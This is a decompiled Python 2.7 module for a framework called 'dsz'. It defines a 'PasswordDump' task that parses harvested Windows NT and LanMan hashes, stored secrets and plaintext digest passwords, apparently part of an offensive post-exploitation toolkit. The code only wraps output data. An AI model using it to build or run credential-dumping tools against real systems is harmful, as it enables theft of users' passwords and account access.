# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.cmd
import dsz.data
import dsz.lp

class PasswordDump(dsz.data.Task):

    def __init__(self, cmd=None):
        dsz.data.Task.__init__(self, cmd)

    def _LoadData(self):
        self.WindowsPassword = list()
        try:
            for x in dsz.cmd.data.Get('WindowsPassword', dsz.TYPE_OBJECT):
                self.WindowsPassword.append(PasswordDump.WindowsPassword(x))

        except:
            pass

        self.WindowsSecret = list()
        try:
            for x in dsz.cmd.data.Get('WindowsSecret', dsz.TYPE_OBJECT):
                self.WindowsSecret.append(PasswordDump.WindowsSecret(x))

        except:
            pass

        self.DigestPassword = list()
        try:
            for x in dsz.cmd.data.Get('DigestPassword', dsz.TYPE_OBJECT):
                self.DigestPassword.append(PasswordDump.DigestPassword(x))

        except:
            pass

    class WindowsPassword(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.exception = dsz.cmd.data.ObjectGet(obj, 'exception', dsz.TYPE_BOOL)[0]
            except:
                self.exception = None

            try:
                self.expired = dsz.cmd.data.ObjectGet(obj, 'expired', dsz.TYPE_BOOL)[0]
            except:
                self.expired = None

            try:
                self.rid = dsz.cmd.data.ObjectGet(obj, 'rid', dsz.TYPE_INT)[0]
            except:
                self.rid = None

            try:
                self.user = dsz.cmd.data.ObjectGet(obj, 'user', dsz.TYPE_STRING)[0]
            except:
                self.user = None

            try:
                self.NtHash = PasswordDump.WindowsPassword.NtHash(dsz.cmd.data.ObjectGet(obj, 'NtHash', dsz.TYPE_OBJECT)[0])
            except:
                self.NtHash = None

            try:
                self.LanManHash = PasswordDump.WindowsPassword.LanManHash(dsz.cmd.data.ObjectGet(obj, 'LanManHash', dsz.TYPE_OBJECT)[0])
            except:
                self.LanManHash = None

            return

        class NtHash(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.Present = dsz.cmd.data.ObjectGet(obj, 'Present', dsz.TYPE_BOOL)[0]
                except:
                    self.Present = None

                try:
                    self.Empty = dsz.cmd.data.ObjectGet(obj, 'Empty', dsz.TYPE_BOOL)[0]
                except:
                    self.Empty = None

                try:
                    self.Value = dsz.cmd.data.ObjectGet(obj, 'Value', dsz.TYPE_STRING)[0]
                except:
                    self.Value = None

                return

        class LanManHash(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.Present = dsz.cmd.data.ObjectGet(obj, 'Present', dsz.TYPE_BOOL)[0]
                except:
                    self.Present = None

                try:
                    self.Empty = dsz.cmd.data.ObjectGet(obj, 'Empty', dsz.TYPE_BOOL)[0]
                except:
                    self.Empty = None

                try:
                    self.Value = dsz.cmd.data.ObjectGet(obj, 'Value', dsz.TYPE_STRING)[0]
                except:
                    self.Value = None

                return

    class WindowsSecret(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.Name = dsz.cmd.data.ObjectGet(obj, 'Name', dsz.TYPE_STRING)[0]
            except:
                self.Name = None

            try:
                self.Value = dsz.cmd.data.ObjectGet(obj, 'Value', dsz.TYPE_STRING)[0]
            except:
                self.Value = None

            return

    class DigestPassword(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.User = dsz.cmd.data.ObjectGet(obj, 'User', dsz.TYPE_STRING)[0]
            except:
                self.User = None

            try:
                self.Domain = dsz.cmd.data.ObjectGet(obj, 'Domain', dsz.TYPE_STRING)[0]
            except:
                self.Domain = None

            try:
                self.Password = dsz.cmd.data.ObjectGet(obj, 'Password', dsz.TYPE_STRING)[0]
            except:
                self.Password = None

            return


dsz.data.RegisterCommand('PasswordDump', PasswordDump)
PASSWORDDUMP = PasswordDump
passworddump = PasswordDump